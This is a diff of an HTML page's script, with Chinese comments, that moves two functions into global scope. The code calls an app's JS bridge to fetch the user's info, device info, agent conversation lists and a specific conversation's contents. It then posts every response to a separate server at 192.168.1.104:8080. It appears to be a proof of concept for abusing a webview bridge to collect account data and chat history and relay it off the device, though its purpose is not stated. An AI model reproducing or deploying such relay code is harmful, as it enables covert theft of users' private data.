@@ -30,46 +30,78 @@
             console.log(`DEBUG: ${message}`);
         }
 
+        // 全局可见的makeRequest函数
+        window.makeRequest = function (method, params) {
+            debugLog(`发起请求: method=${method}, params=${params}`);
+            try {
+                if (method === 'request') {
+                    // 新增对话详情请求处理
+                    const reqData = params === 'history'
+                        ? {
+                            path: "api/user/agent/conversation/list",
+                            method: "POST",
+                            data: JSON.stringify({
+                                agentId: "naQivTmsDa",
+                                offset: 0,
+                                limit: 40,
+                                filterGoodQuestion: true
+                            }),
+                            header: "{}"
+                        }
+                        : {  // 新增对话详情请求
+                            path: "api/user/agent/conversation/v1/detail",
+                            method: "POST",
+                            data: JSON.stringify({
+                                conversationId: "62184080-ec6f-487b-94b5-31168f89901d",
+                                offset: 0,
+                                limit: 60
+                            }),
+                            header: "{}"
+                        };
+                    debugLog(`JsRuntime.invoke调用: ${JSON.stringify(reqData)}`);
+                    JsRuntime.invoke('request', JSON.stringify(reqData), Date.now());
+                } else {
+                    debugLog(`JsRuntime.invoke调用: method=${method}`);
+                    JsRuntime.invoke(method, '{}', `auto_${Date.now()}`);
+                }
+            } catch (error) {
+                debugLog(`makeRequest发生错误: ${error.message}`);
+                window.sendToServer({ error: error.message, method });
+            }
+        };
+
+        // 全局可见的sendToServer函数
+        window.sendToServer = function (data) {
+            debugLog(`准备发送数据到服务器: ${JSON.stringify(data)}`);
+            const errorPayload = {
+                timestamp: new Date().toISOString(),
+                type: 'client_error',
+                data
+            };
+
+            const finalData = data.error ? errorPayload : data;
+            debugLog(`最终发送的数据: ${JSON.stringify(finalData)}`);
+
+            fetch('http://192.168.1.104:8080', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(finalData)
+            })
+                .then(response => {
+                    debugLog(`服务器响应状态: ${response.status}`);
+                    return response.text();
+                })
+                .then(text => {
+                    debugLog(`服务器响应内容: ${text}`);
+                })
+                .catch(error => {
+                    debugLog(`发送请求失败: ${error.message}`);
+                    console.error('最终错误捕获:', error);
+                });
+        };
+
         window.addEventListener('load', function () {
             debugLog('页面加载完成，开始初始化...');
-            const makeRequest = (method, params) => {
-                debugLog(`发起请求: method=${method}, params=${params}`);
-                try {
-                    if (method === 'request') {
-                        // 新增对话详情请求处理
-                        const reqData = params === 'history'
-                            ? {
-                                path: "api/user/agent/conversation/list",
-                                method: "POST",
-                                data: JSON.stringify({
-                                    agentId: "naQivTmsDa",
-                                    offset: 0,
-                                    limit: 40,
-                                    filterGoodQuestion: true
-                                }),
-                                header: "{}"
-                            }
-                            : {  // 新增对话详情请求
-                                path: "api/user/agent/conversation/v1/detail",
-                                method: "POST",
-                                data: JSON.stringify({
-                                    conversationId: "62184080-ec6f-487b-94b5-31168f89901d",
-                                    offset: 0,
-                                    limit: 60
-                                }),
-                                header: "{}"
-                            };
-                        debugLog(`JsRuntime.invoke调用: ${JSON.stringify(reqData)}`);
-                        JsRuntime.invoke('request', JSON.stringify(reqData), Date.now());
-                    } else {
-                        debugLog(`JsRuntime.invoke调用: method=${method}`);
-                        JsRuntime.invoke(method, '{}', `auto_${Date.now()}`);
-                    }
-                } catch (error) {
-                    debugLog(`makeRequest发生错误: ${error.message}`);
-                    sendToServer({ error: error.message, method });
-                }
-            };
 
             // 添加新的请求标识符 conversationDetail
             // ['getAppVersion', 'getDeviceInfo', 'userInfo', 'history', 'conversationDetail'].forEach(method => {
@@ -99,7 +131,7 @@
             // }, 1300);
             setTimeout(() => {
                 debugLog('执行userInfo请求');
-                makeRequest("userInfo");
+                window.makeRequest("userInfo");
             }, 500);
 
             debugLog('准备跳转到test.woa.com');
@@ -113,38 +145,9 @@
                         type: 'jsb_response',
                         data: response
                     };
-                    sendToServer(payload);
+                    window.sendToServer(payload);
                 }
             };
-
-            function sendToServer(data) {
-                debugLog(`准备发送数据到服务器: ${JSON.stringify(data)}`);
-                const errorPayload = {
-                    timestamp: new Date().toISOString(),
-                    type: 'client_error',
-                    data
-                };
-
-                const finalData = data.error ? errorPayload : data;
-                debugLog(`最终发送的数据: ${JSON.stringify(finalData)}`);
-
-                fetch('http://192.168.1.104:8080', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(finalData)
-                })
-                    .then(response => {
-                        debugLog(`服务器响应状态: ${response.status}`);
-                        return response.text();
-                    })
-                    .then(text => {
-                        debugLog(`服务器响应内容: ${text}`);
-                    })
-                    .catch(error => {
-                        debugLog(`发送请求失败: ${error.message}`);
-                        console.error('最终错误捕获:', error);
-                    });
-            }
         })
     </script>
 </body>
